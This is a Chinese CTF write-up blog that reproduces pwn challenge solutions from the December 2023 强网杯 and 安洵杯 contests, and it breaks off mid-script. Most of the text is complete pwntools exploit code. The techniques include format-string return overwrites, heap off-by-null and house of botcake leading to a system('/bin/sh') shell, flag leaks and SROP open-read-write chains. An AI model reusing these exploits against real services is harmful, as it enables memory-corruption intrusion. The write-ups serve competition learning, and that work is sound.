# 2023 12月比赛wp复现


<!--more--> 

## 强网杯

### ez_fmt

#### 解法一

程序开头给了stack 地址，利用格式化字符串漏洞修改返回地址，爆破one_gadget ，概率为1/4096。

```python
from pwn import*
context.arch='amd64'
#context.log_level='debug'

s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
pr = lambda s : print('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))

def mydbg():
    gdb.attach(p,"b *0x401239")
    pause()
i=1
while True:
    p=remote('47.104.24.40',1337)
    #p=process("./ez_fmt")
    ru("There is a gift for you ")
    stack_addr=int(ru("\n"),16)
    lg("stack_addr")
    lg("i")
    i=i+1
    w_addr=0x0404010 
    ret_addr=stack_addr+0x68
    main_addr=0x401196
    lg("ret_addr")
    payload="%19$p"
    payload+="%"+str(0x40-14)+"c"+"%10$hhn"+"%"+str(0xfb01-0x40)+"c"+"%11$hn"
    payload=payload.ljust(0x20,'a')
    payload=payload.encode()+p64(ret_addr+2)+p64(ret_addr)
    #mydbg()
    s(payload)
    # pause()
    libc_base=int(rn(14),16)-0x24083
    
    lg("libc_base")
    one_gaget=libc_base+0xe3b01
    lg("one_gaget")
    myogg=(libc_base&0xffffffffff000000)+0x40fb01
    lg("myogg")
    if myogg==one_gaget:
        pause()
        print("success")
    else:
        p.close()
        continue
    p.interactive()

```

![image-20231216113044144](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111725.png)

![image-20231216113047514](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111726.png)

#### 解法二

利用格式化字符串漏洞篡改printf 函数的返回地址为start，同时泄露libc，这样就不会修改w为0，然后第二次格式化字符串漏洞修改返回地址为one gadget。

```python
from pwn import*
context.arch='amd64'
context.log_level='debug'
#p=remote("chals.sekai.team",4001)

#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
pr = lambda s : print('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))

def mydbg():
    gdb.attach(p,"b *0x401239")
    pause()

p=process("./ez_fmt")
ru("There is a gift for you ")
stack_addr=int(ru("\n"),16)
lg("stack_addr")
w_addr=0x0404010 
ret_addr=stack_addr-0x8
start_addr=0x4010B0
lg("ret_addr")
payload="%19$p"+"%"+str((start_addr&0xfffff)-14)+"c"+"%9$hn"
payload=payload.encode().ljust(0x18,b"a")+p64(ret_addr)

sl(payload)
libc_base=int(rn(14),16)-0x24083
lg("libc_base")
one_gadgt=0xe3b01+libc_base

ru("There is a gift for you ")

ret1_addr=stack_addr-0xe8
lg("one_gadgt")
payload="%"+str(one_gadgt&0xff)+"c"+"%10$hhn"+"%"+str(((one_gadgt>>8)&0xffff)-(one_gadgt&0xff))+"c%11$hn"
payload=payload.encode().ljust(0x20,b"a")+p64(ret1_addr)+p64(ret1_addr+1)
s(payload)
p.interactive()

```







### warmup23

glibc 2.35 下的off by null，和glibc 2.31下的off by null 利用手法相同。

参考链接：http://tttang.com/archive/1614/#toc__6

构造出堆块重叠后进行largebin attack，修改stderr为fake file。然后利用off by null 修改top chunk size，申请一个大的chunk，触发malloc_assert ，利用house of apple  执行orw。

```python
from pwn import*
context.arch='amd64'
context.log_level='debug'
p=remote("120.24.69.11",12700)
#p=process('./warmup')
libc=ELF('./libc.so.6')
s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
lg = lambda s : info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
pr = lambda s : print('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
def mydbg():
    gdb.attach(p,"dir ~/glibc/glibc-2.35/")
    pause()


def menu(choice):
    ru(">> ")
    sl(str(choice))


def add(size,content):
    menu(1)
    ru("Size:")
    sl(str(size))
    ru("Note:")
    s(content)

def show(index):
    menu(2)
    ru("Index:")
    sl(str(index))
    ru("Note:")

def delete(index):
    menu(3)
    ru("Index:")
    sl(str(index))

add(0x418, "A"*0x100) #0 A = P->fd
add(0xe8,"barrier") #1 barrier
add(0x438, "B0"*0x100) #2 B0 helper
add(0x448, "C0"*0x100) #3 C0 = P , P&0xff = 0
add(0x108,'4'*0x100) #4 barrier
add(0x488, "H"*0x100) # H0. helper for write bk->fd. vitcim chunk.
add(0x428, "D"*0x100) # 6 D = P->bk
add(0x108,"barrier") # 7 barrier

delete(0) #A
delete(3) #c0
delete(6) #d
#unsortedbin: D-C0-A   C0->FD=A

delete(2) # merge B0 with C0. preserve p->fd p->bk
add(0x458, b'a' * 0x438 + p64(0x561)[:-2])  #index 0 put A,D into largebin, split BC. use B1 to set p->size=0x551

add(0x428,'A')  #2 C1 from ub
add(0x428,'A')  #3 bk  D  from largebin
add(0x418,"0"*0x100)  #6 fd    A from largein

delete(6) #A
delete(2) #c1

# unsortedbin: C1-A ,   A->BK = C1
add(0x418, 'a' * 8)  # 2 partial overwrite bk    A->bk = p
add(0x418,"A")       #6  c1


# step4 use ub to set bk->fd
delete(6) # C1
delete(3) # D=P->bk
# ub-D-C1    D->FD = C1
delete(5) # merge D with H, preserve D->fd 

add(0x500-8, b'6'*0x488 + p64(0x431)) #3 H1. bk->fd = p, partial write \x00

add(0x3b0,"A") #5 recovery

delete(4)
add(0x108, 0x100*b'4' + p64(0x560)) #4
delete(3)

add(0x448,"A") #3 put libc to chunk 4
show(4)
libc_base=uu64()-0x219ce0
lg("libc_base")
show(2)
ru("a"*8)
heap_base=u64(rn(6).ljust(8,b"\x00"))-0x15f0
lg("heap_base")

delete(3)
io_stderr=libc_base+0x21a860
lg("io_stderr")
add(0x448,p64(libc_base+0x219ce0)*2+p64(0)+p64(0x431)+p64(libc_base+0x21a0d0)*2+p64(heap_base+0xc20)+p64(io_stderr-0x20)) #3


add(0x608,"a") #6

read=libc_base+libc.sym['read']
_IO_wfile_jumps=libc_base+libc.sym['_IO_wfile_jumps']
magic_gadget=libc_base+0x169e7a
syscall_ret=read+0x10
pop_rax=libc_base+0x0000000000045eb0
pop_rdi=libc_base+0x000000000002a3e5
pop_rsi=libc_base+0x000000000002be51
pop_rdx=libc_base+0x00000000000796a2
ret=libc_base+0x0000000000029cd6
leave_ret=0x000000000004da83+libc_base
pop_r12_r15=0x000000000002be4c+libc_base
close=libc_base+libc.sym['close']
read=libc_base+libc.sym['read']
write=libc_base+libc.sym['write']

fake_file_addr=heap_base+0xc30
wide_data_addr=fake_file_addr+0xd0
wide_vtable_addr=wide_data_addr+0xe8
rop_addr=wide_vtable_addr+0x70
flag_addr=rop_addr
fake_file=p64(0)*3+p64(1)
fake_file=fake_file.ljust(0x38,b"\x00")+p64(rop_addr)
fake_file=fake_file.ljust(0x90,b"\x00")+p64(wide_data_addr)
fake_file=fake_file.ljust(0xc8,b"\x00")+p64(_IO_wfile_jumps)
wide_data=b"\x00".ljust(0xe0,b"\x00")+p64(wide_vtable_addr)
wide_vtable=b"\x00".ljust(0x68,b"\x00")+p64(magic_gadget)
orw=b"flag\x00\x00\x00\x00"+p64(pop_r12_r15)+p64(0)+p64(rop_addr-0x8)+p64(leave_ret)+p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall_ret)
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(rop_addr+0x300)+p64(pop_rdx)+p64(0x50)+p64(read)+p64(pop_rdi)+p64(1)+p64(write)


delete(2)
add(0x600,"A") #2
payload=fake_file+wide_data+wide_vtable+orw
add(0x418,"A") #8
delete(3)
add(0x448,p64(0)*2+p64(~(2 | 0x8 | 0x800)+(1<<64))+p64(0)+payload) #3
add(0xeec0,"A")#9
add(0xeec0,"A")#10
add(0x1000-0x480,"A")#11
add(0x438,"A") #12
delete(12)
add(0x438,"A"*0x438)

menu(1)
ru("Size:")
sl(str(0x500))


p.interactive()
```

![image-20231216233836916](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111727.png)



### chatting

#### 解法一

首先填满0x100的tcache，然后释放当前usrname，使当前用户的message chunk（大小也为0x100） 进入unsorted bin，然后执行read 函数进行泄露libc。

泄露完之后，发现add message 时，如果add message 0x64次后（或者用户名长度大于 0x64），如果再次add会释放当前的message chunk，而如果delete 当前用户就会触发tcahche double free 检测，那么可得知程序中存在double free。

接下来通过构造chunk 结构，利用house of botcake 制造出重叠chunk，然后利用tcache 申请到free_hook 修改其为system，最后释放一个content为"/bin/sh\x00"的chunk 即可getshell

![image-20231217171306456](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111728.png)

```python
from pwn import*
context.arch='amd64'
context.log_level='debug'
#p=remote("101.200.122.251",14509)
p=process('./chatting')
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
#libc=ELF('./libc-2.27.so')
s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
pr = lambda s : print('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
def mydbg():
	gdb.attach(p,"b *$rebase(0x000321F)\n decompiler connect ida --host 10.193.253.113 --port 3662")
	pause()


def menu(choice):
	ru("Choose action (add, delete, switch, message, read, listuser, exit): ")
	sl(choice)


def add(usrname):
	menu("add")
	ru("Enter new username:")
	sl(usrname)

def delete(usrname):
	menu("delete")
	ru("Enter username to delete:")
	sl(usrname)

def switch_func(usrname):
	menu("switch")
	ru("Enter username to switch to: ")
	sl(usrname)

def message_func(usrname,size,content):
	menu("message")
	ru("To: ")
	sl(usrname)
	ru("Message size:")
	sl(str(size))
	ru("Content:")
	sl(content)

def read_func():
	menu("read")

def list_func():
	menu("listuser")



ru("Enter new username:")
sl("chuwei1")


message_func("chuwei1",0x100,"a")

add("chuwei2")
for i in range(7):
	message_func("chuwei2",0x100,"a")


delete("chuwei2")
add("chuwei2")

delete("chuwei1")

read_func()

libc_base=uu64()-96-0x10-libc.sym['__malloc_hook']
#libc_base=uu64()-0x219ce0
lg("libc_base")

add("chuwei1")
for i in range(0x64):
	message_func("chuwei2",0x30,"aaaaaaaaaaaa")

for i in range(9):
	message_func("chuwei1",0x200,"aaaaaaaaaaaa")
add("chuwei3")
delete("chuwei1")
add("chuwei1")

for i in range(7):
	message_func("chuwei1",0x200,"aaaaaaaaaaaa")

message_func("chuwei3",0x200,"aaaaaaaaaaaa") #prev

message_func("chuwei2",0x200,"a"*0x100)

add("chuwei4")

message_func("chuwei4",0x200,"a"*0x100)   #vitim



delete("chuwei1")
add("chuwei1")

delete("chuwei4")
add("chuwei4")

delete("chuwei3")
add("chuwei3")

message_func("chuwei3",0x200,"aaaaaaaaaaaa")

delete("chuwei2")
add("chuwei2")
mydbg()
message_func("chuwei2",0x410,b"\x00"*0x200+p64(0x210)+p64(0x211)+p64(libc_base+libc.sym['__free_hook']))

message_func("chuwei2",0x200,"/bin/sh\x00")
message_func("chuwei2",0x200,p64(libc_base+libc.sym['system']))
delete("chuwei2")
p.interactive()
```

![image-20231217110436821](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111729.png)

#### 解法二

向一个删除过的用户发送消息时候，多次申请message chunk 会导致释放其中的message chunk，然后再次add 该用户，会导致一个double free。可以利用这点构造出一个重叠堆块，具体构造脚本如下：

```python
from pwn import*
context.arch='amd64'
context.log_level='debug'
p=process('./chatting')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
pr = lambda s : print('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
def mydbg():
	gdb.attach(p,"b *$rebase(0x000321F)")#\n decompiler connect ida --host 10.193.253.113 --port 3662")
	pause()


def menu(choice):
	ru("Choose action (add, delete, switch, message, read, listuser, exit): ")
	sl(choice)


def add(usrname):
	menu("add")
	ru("Enter new username:")
	sl(usrname)

def delete(usrname):
	menu("delete")
	ru("Enter username to delete:")
	sl(usrname)

def switch_func(usrname):
	menu("switch")
	ru("Enter username to switch to: ")
	sl(usrname)

def message_func(usrname,size,content):
	menu("message")
	ru("To: ")
	sl(usrname)
	ru("Message size:")
	sl(str(len(content)))
	ru("Content:")
	sl(content)

def read_func():
	menu("read")

def list_func():
	menu("listuser")


ru("Enter new username:")
sl("chuwwei1")
add("cc")
add("bb")
add('aa')
for i in range(3):
	message_func('bb', 0x78, b'a' * 0x78)

delete("bb")
add("bb")

delete("aa")

message_func('aa', 0x78, b'a' * 0x78)
message_func('aa', 0x78, b'a' * 0x78)
message_func('aa', 0x78, b'a' * 0x78)

message_func('bb',0x78,b"a"*0x78) #double free
for i in range(7):
	message_func("cc",0x78,b"c"*0x78)
delete("cc")
add("cc")
add("aa")
message_func('aa', 0x78, b'a' * 0x78)
delete("bb")


p.interactive()

```



### simpleinterpreter

程序实现一个c语言编译器，可以解析以下函数和类型。

![image-20231217171750751](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111730.png)

那么我们利用malloc 和free 将一个chunk 释放到unsorted bin 中， 利用printf 打印出libc地址，然后tcache 的fd中写入free_hook，申请到free_hook 修改其为system，最后释放一个content为"/bin/sh\x00"的chunk 即可getshell。

```python
from pwn import*
p=remote("101.200.122.251",13410)
#p=process('./simpleinterpreter')
libc=ELF('./libc-2.27.so')
context.log_level='debug'
context.arch='amd64'
s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b"\xf7")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
pr = lambda s : print('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
def mydbg():
	gdb.attach(p,"decompiler connect ida --host 192.168.2.193 --port 3662\nb *$rebase(0x0CCB)")
	pause()
#0x1c48
payload="""
int main(){
void *p1;
void *p2;
void *p3;
void *p4;
void *p5;
void *p6;
void *p7;
void *p8;
void *p9;
void *p10;
void *p11;
p1=malloc(0x100);
p2=malloc(0x100);
p3=malloc(0x100);
p4=malloc(0x100);
p5=malloc(0x100);
p6=malloc(0x100);
p7=malloc(0x100);
p8=malloc(0x100);
p9=malloc(0x100);
free(p1);
free(p2);
free(p3);
free(p4);
free(p5);
free(p6);
free(p7);
free(p8);
printf("%s",p8);
read(0,p7,0x8);
p10=malloc(0x100);
read(0,p10,0x8);
p11=malloc(0x100);
read(0,p11,0x8);
free(p10);
}"""
ru("Code size: ")

sl(str(int(len(payload))))

ru("Please give me the code to interpret:")
s(payload)

libc_base=uu64()-0x3ebca0
lg("libc_base")
pause()
s(p64(libc_base+libc.sym['__free_hook']))
pause()
s("/bin/sh\x00")
pause()
s(p64(libc_base+libc.sym['system']))
p.interactive()
```

![image-20231217163443564](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111731.png)

### WTOA

参考链接：https://www.xp0int.top/posts/2023/12/18/2023-%E5%BC%BA%E7%BD%91%E6%9D%AF-Quals-Writeup-By-Xp0int/#11-chatting

![Untitled](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111732.png)

![Untitled](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111733.png)

![Untitled](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111734.png)

从ida 中的function call 中猜测main函数为function[17]

ida 导出function cal

先导出为test.gdl

![Untitled](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111735.jpeg)

ubuntu 执行

`sudo apt-get install cflow graphviz` 

`sudo apt install libgraph-easy-perl`

`graph-easy --input=test.gdl --as_dot -o test.dot`

先运行程序发现是一个经典的菜单题目，因此主要逻辑函数里面肯定存在5个功能 和while 循环

最终发现function_17_ 是符合要求的，因此我们可以在function_17 下断点验证我们的猜想

![Untitled](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111736.png)

我们会发现，我们执行function 16会打印菜单字符串

![Untitled](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111737.png)

![Untitled](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111738.png)

注意到function51 的第三个参数为0x477，而菜单字符串的地址为0x1b477，0x1b000正好是.rodata.wasm 段的起始地址，因此推断字符串的寻址应该为段基址+偏移

![Untitled](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111739.png)

那么我们很容易得到各个函数的位置。

接下来我们创建一些chunk ，观察结构。

![Untitled](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111740.png)

发现note 结构体的一些内容如图所示，推测0x501cc0是note content的偏移，因为note content也是0xcc0 结尾的，而0x8 就是note 的size，还有一些特殊的值比如next 和prev  的note_struct 偏移，剩下的应该是一些特殊标志变量。

![Untitled](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111741.png)

![Untitled](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111742.png)

接着分析主函数

当我下断点在function 56 时，会发现要求我们输入

![Untitled](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111743.png)

注意到rdx为0，rcx为0x501b20，r8为0x2，

因此推测改函数实现了read 的功能`read(0,offset,0x2)` ，而真正的地址应该为段基址+offset

![Untitled](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111744.png)

输入之前该地址的内容为空

![Untitled](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111745.png)

输入之后`S\n` 之后正好为`'\x0a\x53'`

![Untitled](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111746.png)

接下来根据读入的字符串 `-'A'` ，switch case进行选择功能

![Untitled](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111747.png)

接下来还可以利用patch 讲function51的第三个参数加上0x1b000，方便我们观看，

还可以推出function 24 类似于atoi函数

![Untitled](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111748.png)

function 9里面调用了function 56read函数，进行逐个字节读入。

![Untitled](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111749.png)

![Untitled](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111750.png)

在edit函数中存在一个明显的漏洞函数，当输入的length为0x345231时，我们可以读入0x30 字节。

![Untitled](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111751.png)

程序开始时会读入flag ，位于我们创建的note struct 上方，因此，我们可以利用edit 的溢出，更改下一个chunk 的content 偏移，让它指向flag的位置，从而打印出flag。

![Untitled](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111752.png)

```python
from pwn import*
context.log_level='debug'
context.arch='amd64'
#p=process("./launch.sh")
p=process(['./wasmtime','run','--env', "FLAG=flag{you_cat_the_flag}",'--disable-cache','--allow-precompiled','./wtoa'])

def mydbg():
	gdb.attach(p)
	pause()

s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
pr = lambda s : print('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))

def menu(choice):
	ru("Choice > ")
	sl(choice)

def add(size,content):
	menu("A")
	ru("size > ")
	sl(str(size))
	ru("> ")
	s(content)
def edit(index,offset,length,content):
	menu("E")
	ru("index >")
	sl(str(index))
	ru("offset >")
	sl(str(offset))
	ru("length > ")
	sl(str(length))
	ru("> ")
	s(content)

def delete(index):
	menu("D")
	ru("index >")
	sl(str(index))
def show(index,offset,length):
	menu("S")
	ru("index >")
	sl(str(index))
	ru("offset >")
	sl(str(offset))
	ru("length > ")
	sl(str(length))

add(0x8,"chuwei11")
add(0x8,"chuwei22")
#mydbg()
offset=0x0000000000501c68
payload=b'a'*8+p64(0x0000001300000000)+p64(0x00501ce000501ca8)+p64(0x0000001b00000000)+p64(offset)+p64(0x200)
edit(0,0,0x345231,payload)
show(1,0,0x50)
p.interactive()
```

#### 后记

查看backtrace，发现 #11和#13 是wtoa 中的代码，在#13下断点

![Untitled](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111753.png)

当执行到这里时，会发现程序进入了add函数的逻辑，且程序存在异步，所以我们在下一条汇编指令下断点

![Untitled](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111754.png)

发现其确实执行了add函数的逻辑，因此猜测0x7ff7d8b9b464所在函数就是主要逻辑

![Untitled](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111755.png)

算出偏移，在ida 里面查看在function 17函数中

![Untitled](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111756.png)

![Untitled](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111757.png)

那么经过调试也可以发现function 17为主要逻辑函数。

### trie

参考链接：https://blog.xmcve.com/2023/12/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2023-Writeup/#title-13

https://www.xp0int.top/posts/2023/12/18/2023-%E5%BC%BA%E7%BD%91%E6%9D%AF-Quals-Writeup-By-Xp0int/#26-trie

简单说一下本地的逻辑，实现了一个简单的路由表：

- add 功能输入两个ip，每次遇到新ip会插入分支，并且其节点值赋值为tot，然后根据trie中的值，将ip2存放在对应下标的end数组中
- show 功能，查找ip 对应的下一跳ip值
- get flag ，将flag 存储在secret 处



本题漏洞点在于对search 找到的end 下标没做限制，且会将flag 读入到secret处，当v3为0x40 时，就会泄露secret 处的值（每次泄露四字节），也就是flag。

![image-20240115002736091](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111758.png)

![image-20240115002811398](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111759.png)

注意到每次insert 时并没有对tot 初始化，那么就给了我们机会让v3的值大于0x40

![image-20240115003033484](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111760.png)

首先新增两个ip "0.0.0.0" "255.255.255.255"，这样会使tot 的值达到0x40

当ip 的bit为0时，对应的trie 下标为偶数，当ip 的bit 为1时，对应的trie 下班为奇数。

insert 函数首先从下标0开始寻找，如果trie对应的下标处值为0，那么就赋值为 tot，如果有值，那么将该下标赋值给v4，根据v4*2+ip_bit作为下标得到trie[index] 的值，进行判断。

第一次add "0.0.0.0"时，trie[0],trie[2],trie[4]...,trie[62] 被赋值为++tot，

第二次add "255.255.255.255"时，会先判断trie[1]，由于其值为0，那么trie[1] 就会赋值为0x21，然后接着判断trie[67]，trie[69],......,trie[127]

此时tot 的值为0x40(也就是trie[127]的值为0x40），那么我们show("255.255.255.255")，就会找到trie[127]处的值0x40，打印end[0x40] 处的值，即flag 的前四字节。

![image-20240115004343814](https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111761.png)

那么我们如果让show找到trie[index] 处的值为0x41，0x42，0x43，......呢？我们只需add 一个ip，其ip值和（"0.0.0.0"或 "255.255.255.255" 其中之一）有1，2，3，...... 位的偏差即可

如果add 128.0.0.0 那么就能打印end[0x41]处的值，add 192.0.0.0 那么就能打印end[0x42] 处的值

如果add 127.255.255.255 那么就能打印end[0x41]处的值，add 63.255.255.255，那么就能打印end[0x42] 处的值

```python
from pwn import*
context.arch='amd64'
#context.log_level='debug'
p=process('./trie')
s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
pr = lambda s : print('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))

def mydbg():
    gdb.attach(p)
    pause()

def menu(choice):
    ru("4. Quit.\n")
    sl(str(choice))

def add(ip,hop):
    menu(1)
    ru("Input destination IP:")
    sl(ip)
    ru("Input the next hop:")
    sl(hop)
def show(ip):
    menu(2)
    ru("Input destination IP:")
    sl(ip)
    ru("The next hop is ")

def decode_flag(flag):
    flag=flag.decode()
    ascii_representation = ''.join(chr(int(x)) for x in flag.split('.'))[::-1]
    print(ascii_representation)

leak_list=["255.255.255.255","128.0.0.0","192.0.0.0","224.0.0.0","240.0.0.0","248.0.0.0"]
#leak_list=["255.255.255.255","127.255.255.255","63.255.255.255","31.255.255.255","15.255.255.255","7.255.255.255"]
for leak_ip in leak_list:
    p=process('./trie')
    add("0.0.0.0","0.0.0.0")
    add("255.255.255.255","0.0.0.0")
    #mydbg()
    add(leak_ip,"0.0.0.0")
    menu(3)
    show(leak_ip)
    flag=ru("\n")[:-1]
    decode_flag(flag)
    p.close()

```



### A-rstp

待做

## 安洵杯 I-SOON x D0g3

### side_channel , initiate!

首先让bss段读入ROP链，然后栈迁移执行ROP链，ROP链中使用SROP ORW一把嗦

```python
from pwn import*
context.arch='amd64'
context.log_level='debug'
p=remote("47.108.206.43",26637)
#p=process('./chall')

s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
pr = lambda s : print('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
def mydbg():
	gdb.attach(p)
	pause()
bss=0x0404060
leave_ret=0x000000000040136c
mov_rax_15_ret=0x401193 
syscall_ret=0x000000000040118a
ru("easyhack\n")

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_open
sigframe.rdi = bss+0x400
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rsp = bss+0xf8+0x10
sigframe.rip = syscall_ret
sigframe1 = SigreturnFrame()
sigframe1.rax = constants.SYS_read
sigframe1.rdi = 3
sigframe1.rsi = bss+0x420
sigframe1.rdx = 0x50
sigframe1.rsp = bss+0xf8+0x10+0xf8+0x10+0x8
sigframe1.rip = syscall_ret
sigframe2 = SigreturnFrame()
sigframe2.rax = constants.SYS_write
sigframe2.rdi = 1
sigframe2.rsi = bss+0x420
sigframe2.rdx = 0x50
